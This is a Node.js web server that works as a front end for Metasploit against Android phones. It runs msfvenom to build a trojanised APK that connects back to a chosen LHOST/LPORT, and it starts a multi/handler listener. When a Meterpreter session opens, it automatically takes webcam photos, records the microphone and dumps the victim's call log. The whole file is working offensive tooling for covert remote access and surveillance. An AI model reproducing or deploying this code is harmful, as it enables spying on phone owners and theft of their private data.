const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const pty = require('node-pty');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

let msfProcess = null;
let running = false;
let sessionActive = false; // Track if a Meterpreter session is active

app.use(express.static('public'));
app.use(express.json());

// Serve the web interface
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Generate APK with msfvenom
app.post('/generate-apk', (req, res) => {
    const { payload, lhost, lport, apkName } = req.body;

    // Input validation
    if (!payload || !lhost || !lport || !apkName) {
        return res.status(400).json({ error: 'All fields are required' });
    }

    // Sanitize inputs to prevent command injection
    const sanitizedApkName = apkName.replace(/[^a-zA-Z0-9_-]/g, '');
    const outputFilePath = path.join(DATA_DIR, `${sanitizedApkName}.apk`);

    const msfvenomCmd = [
        'msfvenom',
        '-p', payload,
        `LHOST=${lhost}`,
        `LPORT=${lport}`,
        '--platform', 'android',
        '--arch', 'dalvik',
        '-o', outputFilePath
    ];

    console.log('Running msfvenom command:', msfvenomCmd.join(' '));

    const msfvenom = pty.spawn(msfvenomCmd[0], msfvenomCmd.slice(1), {
        name: 'xterm-color',
        cols: 80,
        rows: 30,
        cwd: process.cwd(),
        env: process.env
    });

    let output = '';
    msfvenom.onData((data) => {
        output += data;
        io.emit('console', `[MSFVenom] ${data}`);
        console.log(`[MSFVenom] ${data}`);
    });

    msfvenom.onExit(({ exitCode }) => {
        if (exitCode === 0 && fs.existsSync(outputFilePath)) {
            io.emit('console', `[+] APK generated: ${outputFilePath}`);
            res.json({ success: true, message: `APK generated as ${outputFilePath}` });
        } else {
            io.emit('console', `[-] APK generation failed: ${output}`);
            console.error('[-] APK generation failed:', output);
            res.status(500).json({ error: 'APK generation failed', details: output });
        }
    });
});

// Start MSFConsole server
app.post('/start-server', (req, res) => {
    if (running) {
        return res.status(400).json({ error: 'Server already running' });
    }

    const { payload, lhost, lport } = req.body;

    // Input validation
    if (!payload || !lhost || !lport) {
        return res.status(400).json({ error: 'All fields are required' });
    }

    running = true;
    sessionActive = false; // Reset session state
    const msfCommands = [
        'use multi/handler',
        `set PAYLOAD ${payload}`,
        `set LHOST ${lhost}`,
        `set LPORT ${lport}`,
        'set ExitOnSession false',
        'exploit -j'
    ];

    const scriptPath = path.join(DATA_DIR, 'msf_script.rc');
    fs.writeFileSync(scriptPath, msfCommands.join('\n') + '\n');

    msfProcess = pty.spawn('msfconsole', ['-r', scriptPath], {
        name: 'xterm-color',
        cols: 80,
        rows: 30,
        cwd: process.cwd(),
        env: process.env
    });

    msfProcess.onData((data) => {
        const output = data.toString();
        io.emit('console', `[MSF] ${output}`);
        console.log(`[MSF] ${output}`);
        if (output.includes('Meterpreter session')) {
            sessionActive = true; // Mark session as active
            setupDataStorage(lhost, lport);
        }
    });

    msfProcess.onExit(({ exitCode }) => {
        running = false;
        sessionActive = false;
        msfProcess = null;
        if (fs.existsSync(scriptPath)) fs.unlinkSync(scriptPath);
        io.emit('console', `[*] MSF Server stopped with code ${exitCode}`);
        console.log(`[*] MSF Server stopped with code ${exitCode}`);
    });

    msfProcess.on('error', (err) => {
        running = false;
        sessionActive = false;
        msfProcess = null;
        io.emit('console', `[-] MSFConsole error: ${err.message}`);
        console.error(`[-] MSFConsole error: ${err.message}`);
    });

    io.emit('console', '[*] Starting MSFConsole server...');
    res.json({ success: true, message: 'MSF Server started' });
});

// Stop MSFConsole server
app.post('/stop-server', (req, res) => {
    if (!running || !msfProcess) {
        return res.status(400).json({ error: 'Server not running' });
    }

    try {
        msfProcess.write('exit -y\n');
        msfProcess.onExit(() => {
            res.json({ success: true, message: 'MSF Server stopped' });
        });
    } catch (err) {
        io.emit('console', `[-] Stop error: ${err.message}`);
        console.error(`[-] Stop error: ${err.message}`);
        res.status(500).json({ error: 'Failed to stop server' });
    }
});

// Run MSFConsole command
io.on('connection', (socket) => {
    socket.on('run-command', (command) => {
        if (!running || !msfProcess) {
            socket.emit('console', '[-] MSF Server not running');
            return;
        }

        if (!sessionActive) {
            socket.emit('console', '[-] No active Meterpreter session. Please wait for a connection.');
            return;
        }

        const timestamp = new Date().toISOString().replace(/[-:.]/g, '');
        let fullCommand = command.trim().toLowerCase();

        // Correct command mapping
        if (fullCommand === 'webcam_snap' || fullCommand === 'webcamp_snap') { // Handle potential typo
            fullCommand = `webcam_snap -p ${DATA_DIR}/webcam_${timestamp}.jpg`;
        } else if (fullCommand === 'record_mic') {
            fullCommand = `record_mic -d 5 -f ${DATA_DIR}/mic_${timestamp}.wav`;
        } else if (fullCommand === 'dump_calllog') {
            fullCommand = `dump_calllog -o ${DATA_DIR}/calllog_${timestamp}.txt`;
        }

        try {
            msfProcess.write(fullCommand + '\n');
            socket.emit('console', `[>] Sent command: ${fullCommand}`);
            console.log(`[>] Sent command: ${fullCommand}`);
        } catch (err) {
            socket.emit('console', `[-] Command error: ${err.message}`);
            console.error(`[-] Command error: ${err.message}`);
        }
    });
});

// Setup automatic data storage on session start
function setupDataStorage(lhost, lport) {
    if (!sessionActive) return; // Ensure session is active

    const timestamp = new Date().toISOString().replace(/[-:.]/g, '');
    const storageCommands = [
        `webcam_snap -p ${DATA_DIR}/webcam_${timestamp}.jpg`,
        `record_mic -d 5 -f ${DATA_DIR}/mic_${timestamp}.wav`,
        `dump_calllog -o ${DATA_DIR}/calllog_${timestamp}.txt`
    ];

    storageCommands.forEach(cmd => {
        try {
            msfProcess.write(cmd + '\n');
            io.emit('console', `[>] Auto-sent: ${cmd}`);
            console.log(`[>] Auto-sent: ${cmd}`);
        } catch (err) {
            io.emit('console', `[-] Auto-storage error: ${err.message}`);
            console.error(`[-] Auto-storage error: ${err.message}`);
        }
    });
}

server.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});